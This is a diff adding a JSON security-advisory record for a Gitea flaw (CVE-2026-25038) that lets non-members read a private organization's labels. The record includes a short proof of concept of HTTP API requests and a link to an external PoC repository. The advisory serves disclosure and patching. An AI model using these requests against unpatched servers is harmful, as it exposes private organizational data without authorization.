@@ -1,0 +1,59 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-25038",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-200",
+      "CWE-862"
+    ],
+    "description": "## Summary\n\nGitea 1.26.2 does not properly enforce organization visibility restrictions on organization label read endpoints.\n\nA user without access to a private organization can retrieve labels belonging to that organization through the Organization Labels API. As a result, label metadata intended to be restricted to organization members may be disclosed.\n\nThe issue is limited to unauthorized read access. No unauthorized modification of labels was observed.\n\n## Details\n\nThe following endpoints are affected:\n\n* `GET /api/v1/orgs/{org}/labels`\n* `GET /api/v1/orgs/{org}/labels/{id}`\n\nDuring testing, a private organization was created and a label was added to that organization.\n\nAccess to the organization itself was correctly restricted. A user without membership in the organization received a `404 Not Found` response when requesting organization information.\n\nHowever, the same user was still able to retrieve organization labels through the endpoints listed above.\n\nFor comparison, other organization-scoped endpoints such as:\n\n* `GET /api/v1/orgs/{org}/teams`\n* `GET /api/v1/orgs/{org}/hooks`\n* `GET /api/v1/orgs/{org}/actions/secrets`\n\ncorrectly denied access to unauthorized users.\n\nThe label endpoints returned the full Label object, including fields such as:\n\n* `id`\n* `name`\n* `description`\n* `color`\n* `url`\n\nWrite operations were tested separately and remained protected by authorization checks.\n\n## PoC\n\n### Setup\n\nCreate a private organization:\n\n```http\nPOST /api/v1/orgs\nAuthorization: token <owner_token>\n\n{\n  \"username\": \"target-org\",\n  \"visibility\": \"private\"\n}\n```\n\nCreate a label:\n\n```http\nPOST /api/v1/orgs/target-org/labels\nAuthorization: token <owner_token>\n\n{\n  \"name\": \"internal-label\",\n  \"color\": \"#aabbcc\",\n  \"description\": \"private organization label\"\n}\n```\n\nVerify that the organization is not accessible to a non-member:\n\n```http\nGET /api/v1/orgs/target-org\nAuthorization: token <non_member_token>\n```\n\nResponse:\n\n```http\nHTTP/1.1 404 Not Found\n```\n\n### Retrieve all labels\n\nRequest:\n\n```http\nGET /api/v1/orgs/target-org/labels\nAuthorization: token <non_member_token>\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\n```\n\nThe response contains labels belonging to the private organization.\n\n### Retrieve a specific label\n\nRequest:\n\n```http\nGET /api/v1/orgs/target-org/labels/1\nAuthorization: token <non_member_token>\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\n```\n\nThe full Label object is returned.\n\n### Verify write protection\n\nRequest:\n\n```http\nPATCH /api/v1/orgs/target-org/labels/1\nAuthorization: token <non_member_token>\n```\n\nResponse:\n\n```http\nHTTP/1.1 403 Forbidden\n```\n\n### PoC Details\nhttps://anonymous.4open.science/r/Gitea_PoC-EC93/2_poc_private_org_labels_leak\n\n## Impact\n\nUsers who are not authorized to access a private organization can obtain label metadata associated with that organization.\n\nDepending on how labels are used, this may disclose internal organizational information contained in label names or descriptions.\n\nThe issue affects confidentiality only. No integrity or availability impact was observed.",
+    "ghsa_id": "GHSA-v73x-hx65-6pf4",
+    "html_url": "https://github.com/advisories/GHSA-v73x-hx65-6pf4",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v73x-hx65-6pf4"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-25038"
+      }
+    ],
+    "published_at": "2026-07-21T21:46:39Z",
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-v73x-hx65-6pf4",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-25038",
+      "https://github.com/go-gitea/gitea/pull/38151",
+      "https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9",
+      "https://blog.gitea.com/release-of-1.26.3-and-1.26.4",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.26.3",
+      "https://github.com/advisories/GHSA-v73x-hx65-6pf4"
+    ],
+    "severity": "high",
+    "summary": "Gitea: Unauthorized Access to Labels of Private Organizations",
+    "updated_at": "2026-07-21T21:46:40Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "1.26.3",
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": "< 1.26.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-v73x-hx65-6pf4",
+  "repo": null,
+  "repository": null
+}
